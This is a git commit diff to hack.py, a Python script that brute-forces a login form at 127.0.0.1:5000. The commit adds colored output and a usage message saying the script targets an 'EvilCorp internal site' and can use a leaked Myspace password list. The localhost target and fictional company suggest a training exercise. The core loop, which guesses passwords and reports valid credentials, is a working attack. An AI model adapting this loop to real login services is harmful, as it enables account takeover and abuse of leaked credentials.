3fac826c0e16efc5e4baab3a3011d06ffd08e760
nickdibari <ndibari@fordham.edu>
2020-02-26 00:39:35 -0500

    Add color to hacker script output

--- hack.py
+++ hack.py
@@ -4,6 +4,22 @@ import sys
 import requests
 
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    INFO = '\033[37m'
+
+
+def log(msg, color=bcolors.INFO):
+    print(f'{color}{msg}{bcolors.ENDC}')
+
+
 def hack(username, passwords):
     for count, password in enumerate(passwords):
         data = {
@@ -11,20 +27,20 @@ def hack(username, passwords):
             'password': password
         }
 
-        resp = requests.post('http://127.0.0.1:5000/login', data=data)
+        resp = requests.post('http://127.0.0.1:5000/login', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
 
         if resp.status_code == 404:
-            print(f'Username {username} is not valid')
+            log(f'Username {username} is not valid', bcolors.FAIL)
             return
 
         elif resp.status_code == 200:
-            print(f'Password for {username} is {password}')
+            log(f'Password for {username} is {password}', bcolors.OKGREEN)
             return
 
         if count % 10 == 0:
-            print(f'Tried {count} passwords')
+            log(f'Tried {count} passwords')
 
-    print(f'Could not find password for {username}')
+    log(f'Could not find password for {username}', bcolors.FAIL)
 
 
 def main(args):
@@ -44,7 +60,12 @@ def main(args):
 
 if __name__ == '__main__':
     if len(sys.argv) == 1:
-        print('Usage: python hack.py username [--use_myspace]')
+        log('''Usage: python hack.py username [--use_myspace]\n
+Iterate over a list of passwords for a username to brute-force login
+to the EvilCorp internal site\n
+username      : Username of account to hack
+--use_myspace : Optionally use Myspace leaked password list
+''', bcolors.HEADER)
         sys.exit(0)
 
     main(sys.argv)
